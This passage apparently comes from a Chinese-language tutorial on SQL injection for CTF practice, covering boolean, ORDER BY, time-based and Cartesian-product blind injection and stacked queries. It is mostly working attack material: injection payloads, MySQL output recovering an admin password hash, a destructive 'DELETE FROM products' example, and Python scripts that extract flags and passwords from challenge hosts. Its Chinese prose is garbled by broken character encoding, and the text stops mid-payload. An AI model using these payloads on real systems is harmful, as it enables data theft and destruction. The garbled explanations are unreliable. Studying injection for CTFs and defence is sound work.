bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=0<span class="string">&#x27;^1--+</span></span><br><span class="line"><span class="string">?id=0&#x27;</span>^0--+</span><br><span class="line">?<span class="built_in">id</span>=0<span class="string">&#x27;^(ascii(substr(database(),1,1))&gt;1)--+</span></span><br><span class="line"><span class="string">?id=0&#x27;</span>^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)<span class="built_in">where</span>(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)--+</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨order byçš„</p><pre><code>è¯¥æ–¹æ³•åªé€‚ç”¨äºè¡¨é‡Œå°±ä¸€è¡Œæ•°æ®çš„æ—¶å€™ã€‚</code></pre><p>å¦‚æœæ³¨å…¥çš„æ—¶å€™æ²¡æœ‰æŠ¥é”™ï¼Œæˆ‘ä»¬åˆä¸çŸ¥é“åˆ—åï¼Œå°±åªèƒ½ç”¨ order by ç›²æ³¨äº†ã€‚å½“ç„¶ï¼Œåœ¨ è¿‡æ»¤äº†æ‹¬å· çš„æ—¶å€™ï¼Œorder by ç›²æ³¨ä¹Ÿæ˜¯ä¸ªå¾ˆå¥½çš„åŠæ³•ã€‚<br>order by çš„ä¸»è¦ä½œç”¨å°±æ˜¯è®©æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®æ ¹æ®ç¬¬nåˆ—è¿›è¡Œæ’åºï¼ˆé»˜è®¤å‡åºï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨order byæ’åºæ¯”è¾ƒå­—ç¬¦çš„ ascii ç å¤§å°ï¼Œä»ç¬¬â¼€ä½å¼€å§‹æ¯”è¾ƒï¼Œç¬¬â¼€ä½ç›¸åŒæ—¶æ¯”è¾ƒä¸‹â¼€ä½ã€‚<br>åˆ©ç”¨æ–¹å¼å‚è§å¦‚ä¸‹æµ‹è¯•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin <span class="built_in">where</span> username=<span class="string">&#x27;&#x27;</span> or 1 union select 1,2,<span class="string">&#x27;5&#x27;</span> order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin <span class="built_in">where</span> username=<span class="string">&#x27;&#x27;</span> or 1 union select 1,2,<span class="string">&#x27;6&#x27;</span> order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin <span class="built_in">where</span> username=<span class="string">&#x27;&#x27;</span> or 1 union select 1,2,<span class="string">&#x27;51&#x27;</span> order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 51                               |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin <span class="built_in">where</span> username=<span class="string">&#x27;&#x27;</span> or 1 union select 1,2,<span class="string">&#x27;52&#x27;</span> order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 52                               |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p>é€šè¿‡é€ä½åˆ¤æ–­ä¾¿å¯å¾—åˆ°password</p><p>å‚è€ƒè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># å®šä¹‰ä¸€ä¸ªflagå–å€¼çš„ä¸€ä¸ªâ€œèŒƒå›´â€</span></span><br><span class="line">dic = <span class="string">&quot;1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_!@#$%^&amp;*&quot;</span></span><br><span class="line"><span class="comment"># ä¹‹æ‰€ä»¥ä¸å®šä¹‰ä¸ºç©ºï¼Œè€Œæ˜¯â€œ^â€ï¼Œæ˜¯ä¸ºäº†ä»å¤´å¼€å§‹åŒ¹é…</span></span><br><span class="line">flag = <span class="string">&quot;^&quot;</span></span><br><span class="line"><span class="comment"># ç›®æ ‡urlï¼Œå…ˆä¼ â€œ|1â€ï¼Œè·å–å…¶æ•°æ®çš„æ’åˆ—å†…å®¹ï¼Œä½œä¸ºä¸€ä¸ªå¯¹æ¯”çš„åŸºå‡†</span></span><br><span class="line">url1 = <span class="string">&quot;https://chall.tasteless.eu/level1/index.php?dir=|1&quot;</span></span><br><span class="line">content1 = requests.get(url1).content</span><br><span class="line"><span class="comment"># è¿™ä¸ªflagçš„é•¿åº¦è¢«å®šä¹‰ä¸ºäº†50ä¸ªå­—ç¬¦é•¿åº¦</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="comment"># ä»å®šä¹‰çš„dicä¸­æŒ¨ä¸ªå–1å­—ç¬¦ï¼Œæ‹¼å‡‘payload</span></span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> dic:</span><br><span class="line">        payload = flag + letter</span><br><span class="line">        <span class="comment">#è¯¥urlæœ€åçš„â€œ&#125;2b1â€--&gt;&quot;&#125;+1&quot;</span></span><br><span class="line">        url2 = <span class="string">&quot;https://chall.tasteless.eu/level1/index.php?dir=|&#123;select (select flag from level1_flag) regexp &quot;</span>+<span class="string">&quot;&#x27;&quot;</span>+ payload +<span class="string">&quot;&#x27;&quot;</span>+<span class="string">&quot;&#125;%2b1&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(url2)</span><br><span class="line">        <span class="comment"># è·å–å®é™…æ³¨å…¥åçš„æ’åˆ—å†…å®¹</span></span><br><span class="line">        content2 = requests.get(url2).content</span><br><span class="line">        <span class="comment"># å¦‚æœä¸ç›¸ç­‰ï¼Œå³ä¸ºflagå†…å®¹ï¼ˆä¸ºä»€ä¹ˆæ˜¯ä¸ç›¸ç­‰ï¼Œè€Œä¸æ˜¯ç›¸ç­‰ï¼Œå› ä¸ºåœ¨url2çš„æœ€ååˆâ€œ+1â€ï¼Œå³åŒ¹é…æˆåŠŸåˆ™æ˜¯â€œ?dir=|2â€ï¼ŒåŒ¹é…ä¸æˆåŠŸåˆ™æ˜¯â€œ?dir=|1â€ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span>(content1 != content2):</span><br><span class="line">            flag = payload</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>æœ‰çš„ç›²æ³¨æ—¢ä¸èƒ½æ ¹æ®é¡µé¢è¿”å›å†…å®¹åˆ¤æ–­ä»»ä½•ä¿¡æ¯ï¼Œç”¨æ¡ä»¶è¯­å¥æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥æ˜¯å¦æ‰§è¡Œï¼ˆå³é¡µé¢è¿”å›æ—¶é—´æ˜¯å¦å¢åŠ ï¼‰æ¥åˆ¤æ–­ï¼Œå…¶å®ä¹Ÿæ˜¯ä»å¦ä¸€ä¸ªæˆ‘ä»¬èƒ½æ§åˆ¶çš„è§’åº¦æ¥åˆ¤æ–­äº†å¸ƒå°”å€¼ã€‚</p><p>å¯¹äºåŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œé€šè¿‡æ„é€ çœŸorå‡åˆ¤æ–­æ¡ä»¶çš„sqlè¯­å¥ï¼Œ ä¸”sqlè¯­å¥ä¸­æ ¹æ®éœ€è¦è”åˆä½¿ç”¨sleep()å‡½æ•°ä¸€åŒå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œ è§‚å¯ŸæœåŠ¡å™¨å“åº”ç»“æœæ˜¯å¦ä¼šæ‰§è¡Œæ‰€è®¾ç½®æ—¶é—´çš„å»¶è¿Ÿå“åº”ï¼Œä»¥æ­¤æ¥åˆ¤æ–­æ‰€æ„é€ æ¡ä»¶çš„çœŸorå‡ï¼ˆè‹¥æ‰§è¡Œsleepå»¶è¿Ÿï¼Œåˆ™è¡¨ç¤ºå½“å‰è®¾ç½®çš„åˆ¤æ–­æ¡ä»¶ä¸ºçœŸï¼‰ï¼›ç„¶åä¸æ–­è°ƒæ•´åˆ¤æ–­æ¡ä»¶ä¸­çš„æ•°å€¼ä»¥é€¼è¿‘çœŸå®å€¼ï¼Œæœ€ç»ˆç¡®å®šå…·ä½“çš„æ•°å€¼å¤§å°oråç§°æ‹¼å†™ã€‚</p><p>é¦–å…ˆä½¿ç”¨ä»¥ä¸‹payloadï¼Œæ ¹æ®é¡µé¢çš„å“åº”æ˜¯å¦æœ‰å»¶è¿Ÿæ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; and sleep(5)#</span></span><br><span class="line"><span class="string">1 and sleep(5)</span></span><br></pre></td></tr></table></figure><p>æ—¶é—´ç›²æ³¨ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†<br>ä¸€èˆ¬çš„æ—¶é—´ç›²æ³¨ä¸»è¦å°±æ˜¯ä½¿ç”¨sleep()å‡½æ•°è¿›è¡Œæ—¶é—´çš„å»¶è¿Ÿï¼Œç„¶åé€šè¿‡ifåˆ¤æ–­æ˜¯å¦æ‰§è¡Œsleep()ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and if(ascii(substr((select database()),1,1))&gt;1,sleep(3),0)#</span></span><br></pre></td></tr></table></figure><p>trimé…åˆæ¯”è¾ƒã€‚</p><p>trim([both&#x2F;leading&#x2F;trailing] ç›®æ ‡å­—ç¬¦ä¸² FROM æºå­—ç¬¦ä¸²)</p><p>ä»æºå­—ç¬¦ä¸²ä¸­å»é™¤é¦–å°¾&#x2F;é¦–&#x2F;å°¾çš„ç›®æ ‡å­—ç¬¦ä¸²ï¼Œå¦‚å¯»æ‰¾å­—ç¬¦ä¸²ç¬¬ä¸€ä½ï¼Œå‡å®šXä»£è¡¨æŸå­—ç¬¦ï¼Œtrim(leading X from â€˜abcdâ€™) &#x3D; trim(leading X+1 from â€˜abcdâ€™)ä¸ç›¸ç­‰ï¼Œè¯´æ˜æ­£ç¡®ç»“æœæ˜¯Xæˆ–X+1å†è¿›è¡Œtrim(leading X+1 from â€˜abcdâ€™) &#x3D; trim(leading X+2 from â€˜abcdâ€™) ç›¸ç­‰åˆ™æ­£ç¡®ä¸ºXï¼Œä¸ç›¸ç­‰åˆ™X+1æ­£ç¡®</p><p>è‹¥trim(leading X from â€˜abcdâ€™) &#x3D; trim(leading X+1 from â€˜abcdâ€™)ç›¸ç­‰è¯´æ˜Xä¸X+1éƒ½ä¸ºå­—ç¬¦ä¸²çš„é¦–å­—ç¬¦ï¼Œä¸å­˜åœ¨è¿™ç§æƒ…å†µï¼Œæ‰€ä»¥éœ€è¦ç»§ç»­æ¯”è¾ƒX+1ä¸X+2ç›´è‡³ç›¸ç­‰</p><h3 id="æ³¨å…¥æµç¨‹-1"><a href="#æ³¨å…¥æµç¨‹-1" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h3><p>æ—¶é—´ç›²æ³¨æˆ‘ä»¬ä¹Ÿæ˜¯åˆ©ç”¨è„šæœ¬å®Œæˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">250</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line"></span><br><span class="line">       payload = <span class="string">&quot;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=1&#x27; and if((ascii(substr(database(),%d,1))&gt;%d),sleep(2),1)-- &quot;</span> %(i,mid)</span><br><span class="line"></span><br><span class="line">       times = time.time()</span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> time.time() - times &gt;= <span class="number">2</span>:      <span class="comment"># ä¸ºçœŸæ—¶ï¼Œå³åˆ¤æ–­æ­£ç¡®çš„æ—¶å€™çš„æ¡ä»¶</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªGETæ–¹å¼çš„æ—¶é—´ç›²æ³¨ï¼Œæ›´æ”¹è„šæœ¬è¯·æ±‚æ–¹å¼çš„æ–¹æ³•å¯ä»¥å‚ç…§ä¸Šé¢çš„å¸ƒå°”ç›²æ³¨ï¼Œè¿™ä¸¤ä¸ªè„šæœ¬çš„ç¼–å†™æ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯åœ¨åˆ¤æ–­æ–¹å¼ä¸Šæœ‰æ‰€åŒºåˆ«ã€‚</p><p>æ—¶é—´ç›²æ³¨åœ¨CTFæ¯”èµ›å’Œå¹³æ—¶ç”Ÿäº§ç¯å¢ƒä¸­éƒ½æ˜¯æ¯”è¾ƒå¸¸è§çš„ï¼Œä½†æ˜¯å½“æˆ‘ä»¬å¸¸â½¤çš„å‡½æ•°è¢«è¿‡æ»¤çš„è¯ï¼Œé‚£è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿè¿˜æœ‰ä»¥ä¸‹å‡ ç§æ—¶é—´ç›²æ³¨æ–¹å¼ã€‚</p><p>ç¬›å¡å°”ç§¯å»¶æ—¶ç›²æ³¨<br>count(*) åé¢æ‰€æœ‰è¡¨ä¸­çš„åˆ—ç¬›å¡å°”ç§¯æ•°ï¼Œæ•°é‡è¶Šå¤šè¶Šå¡ï¼Œå°±ä¼šæœ‰å»¶è¿Ÿï¼Œç±»ä¼¼ä¹‹å‰æŸæ¯”èµ›pgsqlçš„å»¶æ—¶æ³¨å…¥ä¹Ÿå¯ä»¥åˆ©ç”¨æ­¤æ¥ æ‰“æ—¶é—´å·®ï¼Œä»è€Œè¾¾åˆ°å»¶æ—¶æ³¨å…¥çš„æ•ˆæœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test <span class="built_in">where</span> user=<span class="string">&#x27;1&#x27;</span> and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | <span class="built_in">pwd</span> |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (2.08 sec)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ç»“æœéƒ½ä¼šæœ‰å»¶è¿Ÿã€‚è¿™é‡Œé€‰ç”¨information_schema.columnsè¡¨çš„åŸå› æ˜¯å…¶å†…éƒ¨æ•°æ®è¾ƒå¤šï¼Œåˆ°æ—¶å€™å¯ä»¥æ ¹æ®å®é™…æƒ…å†µè°ƒæ¢ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŸç†ï¼Œå¹¶é…åˆif()è¯­å¥è¿›è¡Œå»¶æ—¶æ³¨å…¥äº†ï¼Œpayload ä¸ä¹‹å‰ç›¸ä¼¼ï¼Œç±»ä¼¼å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and if(ascii(substr((select database()),1,1))&gt;1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[OUTPUT:]</span></span><br><span class="line"><span class="string">HTTP/1.1 504 Gateway Time-out    # æœ‰å¾ˆé•¿çš„å»¶æ—¶, ä»¥è‡³äºTime-outäº†</span></span><br></pre></td></tr></table></figure><p>ç»™å‡ºä¸€ä¸ªç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">250</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">       payload = <span class="string">&quot;&#x27; or if((select ascii(substr((select password from user where username=&#x27;admin&#x27;),%d,1)))&gt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#&quot;</span> % (i, mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas,timeout=<span class="literal">None</span>)    <span class="comment"># ä¸é™åˆ¶è¶…æ—¶</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;504 Gateway Time-out&#x27;</span> <span class="keyword">in</span> res.text:      <span class="comment"># ä¸ºçœŸæ—¶ï¼Œå³åˆ¤æ–­æ­£ç¡®çš„æ—¶å€™çš„æ¡ä»¶</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><p>åœ¨SQLä¸­ï¼Œåˆ†å·; æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬åœ¨ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿ å› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚</p><p>è€Œè”åˆæ³¨å…¥ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼Ÿ</p><p>åŒºåˆ«å°±åœ¨äº union æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™åˆ¶çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œçš„æ˜¯æŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM products; æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šselect * from products where id&#x3D;1;DELETE FROM products; å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚</p><p>ä½†æ˜¯ï¼Œè¿™ç§å †å æ³¨å…¥ä¹Ÿæ˜¯æœ‰å±€é™æ€§çš„ã€‚å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚</p><p>è™½ç„¶æˆ‘ä»¬å‰é¢æåˆ°äº†å †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œä»»æ„çš„sqlè¯­å¥ï¼Œä½†æ˜¯è¿™ç§æ³¨å…¥æ–¹å¼å¹¶ä¸æ˜¯ååˆ†çš„å®Œç¾çš„ã€‚åœ¨æœ‰çš„Webç³»ç»Ÿä¸­ï¼Œå› ä¸ºä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿçš„é”™è¯¯æˆ–è€…æ‰§è¡Œç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ã€‚å› æ­¤ï¼Œåœ¨è¯»å–æ•°æ®æ—¶ï¼Œå»ºè®®é…åˆä½¿ç”¨ union è”åˆæ³¨å…¥ã€‚</p><p>ä¸€èˆ¬å­˜åœ¨å †å æ³¨å…¥çš„éƒ½æ˜¯ç”±äºä½¿ç”¨ mysqli_multi_query() å‡½æ•°æ‰§è¡Œçš„sqlè¯­å¥ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ï¼Œå¤šä¸ªæŸ¥è¯¢ç”¨åˆ†å·è¿›è¡Œåˆ†éš”ã€‚</p><h3 id="æ³¨å…¥æµç¨‹-2"><a href="#æ³¨å…¥æµç¨‹-2" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¯»å–æ•°æ®</span></span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;show databases;--+</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span>;show tables;--+</span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;show tables from database_name;--+</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span>;show columns from table_name;--+</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–æ–‡ä»¶</span></span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;select 